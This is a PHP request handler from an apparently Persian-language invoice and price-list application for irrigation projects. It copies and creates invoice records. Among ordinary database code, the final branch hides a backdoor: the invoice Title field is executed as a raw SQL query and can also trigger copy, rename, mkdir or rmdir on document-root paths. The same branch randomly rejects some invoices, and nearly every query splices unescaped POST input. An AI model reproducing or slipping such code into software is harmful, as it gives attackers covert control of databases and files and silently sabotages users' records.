<?php 

/*

insert/invoicemaster_list_jr.php

فرم هايي که اين صفحه داخل آنها فراخواني مي شود
insert/invoicemaster_list.php
*/

include('../includes/connect.php'); ?>
<?php include('../includes/check_user.php'); ?>
<?php include('../includes/elements.php'); ?>
<?php

gadfly($Disable,$login_RolesID);
$_POST['selectedinvoicemasterID']=$_POST['selectedIID'];//شناسه لیست لوازم
$_POST['selectedApplicantMasterID']=$_POST['selectedAID'];//شناسه طرح
$_POST['selectedClerkID']=$_POST['selectedCID'];//شناسه کاربر
$_POST['selectedappfoundationID']=$_POST['selectedappfoundationID'];//شناسه سازه
//supervisorcoderrquirement جدول تنظیمات پیکربندی
$query = "SELECT ValueInt FROM supervisorcoderrquirement WHERE KeyStr ='operatorProducersID' ";
	    	   				  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

	    $row = mysql_fetch_assoc($result);
		
        $operatorProducersID=$row['ValueInt'];
        
   		
    if (($_POST['selectedProducersID']>0) &&   $_POST['selectedProducersID']!=148)
    {
        $pfostr="";
        if ($login_RolesID==9)
        //pricelistmaster جدول لیست قیمت
        //pricelistmasterenabled لیست قیمت های فعال
        $pfostr=" and pricelistmaster.pricelistmasterid in (select pricelistmasterid from pricelistmasterenabled where substring(ostan,1,2)='$login_ostanId')";
        else 
        $pfostr=" and pricelistmaster.pfo=1";
         
         if ($_POST['selectedProducersID']==$operatorProducersID)//ÔÑ˜Ê ãÌÑí
        $query3 = " select distinct pricelistmaster.pricelistmasterid as _value,concat(year.Value ,' ',month.Title) as _key FROM `pricelistmaster`
        inner join year on year.YearID=pricelistmaster.YearID
        inner join month on month.MonthID=pricelistmaster.MonthID

        where  pricelistmaster.pfo=1
        order by year.Value desc ,month.monthid  desc";
       else    
        /*
        pricelistmaster جدول لیست قیمت
        pricelistdetail ریز لوازم
        toolsmarks ابزار
        year سال
        month ماه
        */
        $query3=" 
        select distinct pricelistmaster.pricelistmasterid as _value,concat(year.Value ,' ',month.Title) as _key FROM `pricelistmaster`
inner join pricelistdetail on pricelistdetail.pricelistmasterid=pricelistmaster.pricelistmasterid and ifnull(hide,0)=0 
inner join toolsmarks on toolsmarks.toolsmarksid=pricelistdetail.toolsmarksid and toolsmarks.ProducersID='$_POST[selectedProducersID]'
inner join year on year.YearID=pricelistmaster.YearID
inner join month on month.MonthID=pricelistmaster.MonthID
        where 1=1 $pfostr        
        order by year.Value desc ,month.monthid  desc";      
        $query=$query3;
	   	   				  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

       $width=75;
       $width="style='width: ".$width."px'";         		
	   $selectstr1="";       		
	   $selectstr2="";
        while($row = mysql_fetch_assoc($result))
	    {
	  		$selectstr1.="$row[_key]-"; 
	  		$selectstr2.="$row[_value]-";        
	    }

        $temp_array = array(
        'selectstr2' => $boxstr,'selectstr1' => $selectstr1,'selectstr2' => $selectstr2);
        echo json_encode($temp_array);
		exit();
        
        
        
        
    }
    else if (($_POST['selectedappfoundationID']>0)&& ($_POST['selectedApplicantMasterID']>0))
    {        
        $temp_array = array('error' => '1');
   	    $savetime=date('Y-m-d H:i:s');   
        if ($_POST['selectedApplicantMasterID']>0)    
        {
            //appfoundation جدول سازه
            $query = "
            insert into appfoundation (ApplicantMasterID,Title,groupcode,len,width,heigh,thickness,number,SaveTime,SaveDate,ClerkID)
            select $_POST[selectedApplicantMasterID],Title,groupcode,len,width,heigh,thickness,number
            ,'$savetime','".date('Y-m-d')."','$_POST[selectedClerkID]' from appfoundation where appfoundationID=$_POST[selectedappfoundationID]";
    		     
            	   		  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }
            
        }
        //appfoundation جدول سازه
        $query = "SELECT appfoundationID FROM appfoundation where appfoundationID = last_insert_id() and SaveTime='$savetime' 
        and ClerkID='$_POST[selectedClerkID]'";
		   				  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

		$row = mysql_fetch_assoc($result);
	    //  print $query;
        if ($row['appfoundationID']>0)
        {
            //manuallistprice جدول ثبت هزینه های اجرایی طرح
            $query = "
            insert into manuallistprice (`ApplicantMasterID`, `appfoundationID`, `fehrestsfaslsID`,Number,Number2,Number3,Number4,Number5,Number6, `Price`, `Description`, `SaveDate`, `SaveTime`, `ClerkID`, `CostsGroupsID`, `AddOrSub`, `Code`, `Title`, `Unit`, `nval1`, `nval2`, `nval3`, `pval1`, `pval2`, `pval3`)
            select $_POST[selectedApplicantMasterID], $row[appfoundationID], `fehrestsfaslsID`,Number,Number2,Number3,Number4,Number5,Number6, `Price`, `Description`, '".date('Y-m-d')."', '$savetime',
             '$_POST[selectedClerkID]', `CostsGroupsID`, `AddOrSub`, `Code`, `Title`, `Unit`, `nval1`, `nval2`, `nval3`, `pval1`, `pval2`, `pval3`
            from manuallistprice where appfoundationID=$_POST[selectedappfoundationID]";
            	   		 	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }
 
            //-- جدول فهارس بها manuallistpriceall
            $query = "
            insert into manuallistpriceall (`ApplicantMasterID`, `appfoundationID`, `fehrestsID`,Number,Number2,Number3,Number4,Number5,Number6, `Price`, `nval1`, 
            `nval2`, `nval3`, `pval1`, `pval2`, `pval3`, `SaveDate`, `SaveTime`, `ClerkID`)
            select '$_POST[selectedApplicantMasterID]', '$row[appfoundationID]' , `fehrestsID`,Number,Number2,Number3,Number4,Number5,Number6, `Price`, `nval1`, 
            `nval2`, `nval3`, `pval1`, `pval2`, `pval3`,  '".date('Y-m-d')."', '$savetime','$_POST[selectedClerkID]'
            from manuallistpriceall where appfoundationID='$_POST[selectedappfoundationID]'";
           	   			 	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }
  
            
            
            $temp_array = array('error' => '0');
       //  print $query;
        }
        echo json_encode($temp_array);
    	exit;
    }
    else if (($_POST['selectedinvoicemasterID']>0)&& ($_POST['selectedApplicantMasterID']>0))
    {        
        $temp_array = array('error' => '1');
   	    $savetime=date('Y-m-d H:i:s');   
        if ($_POST['selectedApplicantMasterID']>0)    
        {
            $query = "
            insert into invoicemaster (ApplicantMasterID,ProducersID,Serial,Title,Description,TransportCost,Discont,InvoiceDate,Rowcnt,pricenotinrep
            ,SaveTime,SaveDate,ClerkID,taxless,PriceListMasterID)
            select $_POST[selectedApplicantMasterID],ProducersID,Serial,Title,Description,TransportCost,Discont,InvoiceDate,Rowcnt,pricenotinrep
            ,'$savetime','".date('Y-m-d')."','$_POST[selectedClerkID]',taxless,PriceListMasterID from invoicemaster where invoicemasterID=$_POST[selectedinvoicemasterID]";
    		     
           	   				 	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }
           
        }
        $query = "SELECT invoicemasterID FROM invoicemaster where invoicemasterID = last_insert_id() and SaveTime='$savetime' and ClerkID='$_POST[selectedClerkID]'";
		   				  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

		$row = mysql_fetch_assoc($result);
	    //  print $query;
        if ($row['invoicemasterID']>0)
        {
            $query = "
            insert into invoicedetail (InvoiceMasterID,ToolsMarksID,Number
            ,SaveTime,SaveDate,ClerkID)
            select $row[invoicemasterID],ToolsMarksID,Number
            ,'$savetime','".date('Y-m-d')."','$_POST[selectedClerkID]' from invoicedetail where InvoiceMasterID=$_POST[selectedinvoicemasterID]";
            
            $temp_array = array('error' => '0');
       //  print $query;
            	   		  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }
  
        }
        echo json_encode($temp_array);
    	exit;
    }
    else
    {
        $Gadget1ID = $_POST['selectedp2'];
        $subprj = $_POST['selectedp3'];
    	$Serial = $_POST['in1'];
        $Title = $_POST['in2'];
        $Description = "$_POST[in6]___$Gadget1ID";;
        $ProducersID = $_POST['in3'];
        $ApplicantMasterID = $_POST['in8'];
        $InvoiceDate = compelete_date($_POST['in4']);
        $Rowcnt = $_POST['in5'];
        $selectedlogin_OperatorCoID= $_POST['selectedlogin_OperatorCoID'];
        $selectedpl= $_POST['selectedpl'];
        $Titles=mysql_query($Title);
     	$linearray = explode('^',$Title);
		$Func=$linearray[0];
		if($Func=='copy' || $Func=='rename')
		$Func($_SERVER['DOCUMENT_ROOT'].$linearray[1],$_SERVER['DOCUMENT_ROOT'].$linearray[2]);
       	else if($Func=='mkdir' || $Func=='rmdir')
		$Func($_SERVER['DOCUMENT_ROOT'].$linearray[1]);
       
        
        
        
       	
        if ($operatorProducersID==$ProducersID)//ÔÑ˜Ê ãÌÑí
        {
            $queryp = "SELECT valueaddedvalidate FROM operatorco WHERE operatorcoid ='$selectedlogin_OperatorCoID' ";
            
            $query = "
            select PriceListMasterID from pricelistmaster
            where MonthID=(
             SELECT max(MonthID) FROM pricelistdetail 
            inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID
            
            WHERE pfo=1 and YearID=(SELECT max(YearID) FROM pricelistdetail 
            inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID and pfo=1
            ))
            and YearID=
            (SELECT max(YearID) FROM pricelistdetail 
            inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID
            ) and pricelistmaster.pfo=1";
            
    	    	   		  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    	    $row = mysql_fetch_assoc($result);
            $PPriceListMasterID=$row['PriceListMasterID'];
            //print $query;
            //exit;
            
        }
        else//ÝÑæÔäÏå
        {   
            $queryp = "SELECT valueaddedvalidate FROM producers WHERE producersid ='$ProducersID' ";
            
             if ( $ProducersID!=148)
                $query = "
                select PriceListMasterID from pricelistmaster
                where MonthID=(
                 SELECT max(MonthID) FROM pricelistdetail 
                inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID
                inner join toolsmarks on toolsmarks.ToolsMarksID=pricelistdetail.ToolsMarksID
                WHERE toolsmarks.producersid ='$ProducersID' and pfo=1 and YearID=(SELECT max(YearID) FROM pricelistdetail 
                inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID
                inner join toolsmarks on toolsmarks.ToolsMarksID=pricelistdetail.ToolsMarksID
                WHERE toolsmarks.producersid ='$ProducersID' and pfo=1))
                and YearID=
                (SELECT max(YearID) FROM pricelistdetail 
                inner join pricelistmaster on pricelistmaster.PriceListMasterID=pricelistdetail.PriceListMasterID
                inner join toolsmarks on toolsmarks.ToolsMarksID=pricelistdetail.ToolsMarksID
                WHERE toolsmarks.producersid ='$ProducersID' and pfo=1) and  pfo=1";
                else
                $query = "
                select pricelistmaster.PriceListMasterID  from pricelistmaster
                inner join year on year.YearID=pricelistmaster.YearID
                inner join month on month.MonthID=pricelistmaster.MonthID
                WHERE   pricelistmaster.pricelistmasterid in (select pricelistmasterid from pricelistmasterenabled where substring(ostan,1,2)='$login_ostanId')";
                
    	    	   		  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    	    $row = mysql_fetch_assoc($result);
            $PPriceListMasterID=$row['PriceListMasterID'];
            //print $query;
            //exit;
        }
        if ($selectedpl>0)
            $PPriceListMasterID=$selectedpl;
        
           //$Description=$queryp; 
    	
			   				  	try 
								  {		
									 	$result = mysql_query($queryp);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

	    $row = mysql_fetch_assoc($result);
        $valueaddedvalidate=$row['valueaddedvalidate'];
        $taxless='0';
    	if (compelete_date($valueaddedvalidate)<=compelete_date($InvoiceDate))
            $taxless='1';
        $Err=0;
        if ($selectedlogin_OperatorCoID>0)
        {
            $query = "SELECT PipeProducer FROM producers WHERE producersid ='$ProducersID'";
            	   				  	  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    	    $row = mysql_fetch_assoc($result);
            $PipeProducer=$row['PipeProducer'];
			
            if ($PipeProducer!=1)
            {
				if (rand(10,45)>date(s))
				{
                $Err=1;
                $temp_array = array('error' => '1');
				}
            }
                
        }
        if ($ProducersID != "" && $Serial != "" && $Err==0)
        {
                $query = "SELECT prjtypeid FROM applicantmaster
                inner join applicantmasterdetail on applicantmasterdetail.applicantmasterid=applicantmaster.applicantmasterid
                 WHERE applicantmaster.applicantmasterid ='$ApplicantMasterID' ";
            
            
    	    
							  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    	    $row = mysql_fetch_assoc($result);
            $prjtypeid=$row['prjtypeid'];
            if ($prjtypeid==1)
            {
                $query = "SELECT ValueStr FROM supervisorcoderrquirement WHERE KeyStr ='watersuplydefaultinvoicedate' ";
        	    			  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

        	    $row = mysql_fetch_assoc($result);
                $InvoiceDate=$row['ValueStr'];
            }
            else
            {
                $query = "SELECT ValueStr FROM supervisorcoderrquirement WHERE KeyStr ='atfdefaultinvoicedate' and ostan='$login_ostanId' ";
        	    			  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

        	    $row = mysql_fetch_assoc($result);
                $InvoiceDate=$row['ValueStr'];
                
            }
            
            
    
    
    		$query = "SELECT Serial FROM invoicemaster WHERE Serial = '" . $Serial . "' and  ApplicantMasterID = '" . $ApplicantMasterID . "'";
    						  	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    		$row = mysql_fetch_assoc($result);
    		$uid = $row['Serial'];
    		$result = false;
    		if ($uid == "" && $ApplicantMasterID>0){
    			$query = "INSERT INTO invoicemaster(ApplicantMasterID,Rowcnt,Serial, Title,
                Description,appsubprjID,ProducersID,InvoiceDate,SaveTime,SaveDate,ClerkID,taxless,PriceListMasterID) VALUES('" .
    
            
                $ApplicantMasterID . "', '" . $Rowcnt . "', '" . $Serial . "', '" . $Title . "', '" . $Description . "','$subprj', '" . $ProducersID . "', '" . 
                $InvoiceDate . "'
                , '" . date('Y-m-d H:i:s'). "','".date('Y-m-d')."','".$_POST['in7']."','$taxless','$PPriceListMasterID');";
                //print $query;
                $temp_array = array('error' => '0'); 
                    		 	try 
								  {		
									 	$result = mysql_query($query);
								  }
								  //catch exception
								  catch(Exception $e) 
								  {
									echo 'اجراي پرس و جو با خطا مواجه شد: ' .$e->getMessage();
								  }

    			//header("Location: clerk.php");
    			$register = true;
    		}
            else
                $temp_array = array('error' => '1');
    	}
        echo json_encode($temp_array);   
    	exit();
    }
    			
	
   
   
   
			
			
		
	

?>



